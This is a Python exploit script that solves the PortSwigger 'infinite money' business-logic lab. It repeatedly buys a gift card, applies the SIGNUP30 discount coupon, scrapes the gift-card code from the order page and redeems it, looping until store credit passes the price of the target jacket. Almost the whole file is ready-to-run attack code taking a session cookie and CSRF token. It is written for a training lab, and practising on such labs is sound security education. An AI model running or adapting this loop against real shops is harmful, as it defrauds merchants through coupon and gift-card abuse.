#!/usr/bin/env python3
#To solve the lab
#https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

import requests
from bs4 import BeautifulSoup
from threading import Thread
import re
import argparse
from time import sleep

def sendRequests(url, cookie, csrfToken):
    buyGiftCardData = {
        'productId': '2',
        'redir': 'PRODUCT',
        'quantity': 1
    }

    applyCouponData = {
        'csrf': csrfToken,
        'coupon': 'SIGNUP30'
    }

    placeOrderData = {
        'csrf': csrfToken
    }

    try:
        # Buy a gift card
        response = requests.post(url + '/cart', cookies=cookie, data=buyGiftCardData)
        response.raise_for_status()

        # Apply SIGNUP30 coupon
        response = requests.post(url + '/cart/coupon', cookies=cookie, data=applyCouponData)
        response.raise_for_status()

        # Place order and fetch gift card code
        response = requests.post(url + '/cart/checkout', cookies=cookie, data=placeOrderData, allow_redirects=True)
        response.raise_for_status()
        orderText = response.text

        # Extract the value of gift card code
        soup = BeautifulSoup(orderText, 'html.parser')
        tableTd = soup.find_all('td')
        giftCardCode = ''
        for td in tableTd:
            if len(td.text.strip()) == 10:
                giftCardCode = td.text.strip()
                print("found this gift card", giftCardCode)
                break

        if len(giftCardCode) == 10:
            redeemGiftCardData = {
                'csrf': csrfToken,
                'gift-card': giftCardCode
            }

            # Redeem gift card
            response = requests.post(url + '/gift-card', cookies=cookie, data=redeemGiftCardData)
            response.raise_for_status()

            # Check store credit
            response = requests.get(url + '/my-account', cookies=cookie)
            response.raise_for_status()
            myaccountText = response.text

            soup = BeautifulSoup(myaccountText, 'html.parser')
            strongTag = soup.find('strong')
            storeCredit = float(re.search(r'([0-9]+\.[0-9]{2})', strongTag.text).group(0))

            if storeCredit >= 935.90:
                print('[+] You now can buy the leather jacket WITH the SIGNUP30 coupon.')
                print(f'[+] Store credit: ${str(storeCredit)}')
                exit()
            else:
                print(f'[*] Current store credit: ${str(storeCredit)}', end='\r')
        else:
            print("No gift-card found")

    except requests.exceptions.RequestException as e:
        print(f"[!] HTTP request failed: {e}")

def main():
    parser = argparse.ArgumentParser(description='Exploit infinite money logic flaw in PortSwigger business logic vulnerabilities lab.')
    parser.add_argument('-u', '--url', metavar='URL', required=True, help='Full URL of the lab. E.g: https://0a9b002b0469da23c5c03cf3003e007b.web-security-academy.net')
    parser.add_argument('-c', '--cookie', metavar='Cookie', required=True, help='Session cookie of your user wiener. E.g: Efi6qVmgThhBsbkiTeugTPMQQ2DtofbC')
    parser.add_argument('-t', '--token', metavar='CSRF_Token', required=True, help='CSRF token. E.g: yVr8Bdqr24wuRU6e6IjZCkdgEhfY3s3c')
    args = parser.parse_args()

    url = args.url
    cookie = {'session': args.cookie}
    csrfToken = args.token

    while True:
        sendRequests(url, cookie, csrfToken)
        sleep(0.7)

if __name__ == '__main__':
    main()
